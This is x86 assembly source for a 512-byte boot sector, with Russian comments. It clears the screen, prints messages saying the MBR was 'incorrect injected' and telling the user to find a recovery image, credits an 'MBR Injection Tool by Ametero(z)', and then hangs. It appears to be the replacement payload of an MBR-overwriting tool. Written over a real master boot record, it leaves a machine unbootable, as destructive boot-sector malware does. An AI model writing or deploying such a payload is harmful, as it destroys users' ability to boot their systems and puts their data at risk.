[org 0x7C00]

start:
    ; Очистка экрана
    mov ax, 0x0700
    mov bh, 0x07
    mov cx, 0x0000
    mov dx, 0x184F
    int 0x10

    ; Установка позиции курсора
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0000
    int 0x10

    ; Вывод первой строки
    mov si, message1
    call print_string

    ; Установка позиции курсора на следующую строку
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0100
    int 0x10

    ; Вывод второй строки
    mov si, message2
    call print_string

    ; Установка позиции курсора на следующую строку
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0200
    int 0x10

    ; Вывод третьей строки
    mov si, message3
    call print_string

    ; Установка позиции курсора на следующую строку
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0300
    int 0x10

    ; Вывод четвёртой строки
    mov si, message4
    call print_string

    ; Бесконечный цикл
    jmp $

print_string:
    lodsb
    or al, al
    jz done
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp print_string

done:
    ret

message1 db 'Sorry! But MBR was incorrect injected!!!', 0
message2 db 'Download any recovery image and recover MBR', 0
message3 db '       Sorry, and good luck!', 0
message4 db '  MBR Injection Tool by Ametero(z) | MBR Inject by Ametero(z)', 0

times 510 - ($ - $$) db 0
dw 0xAA55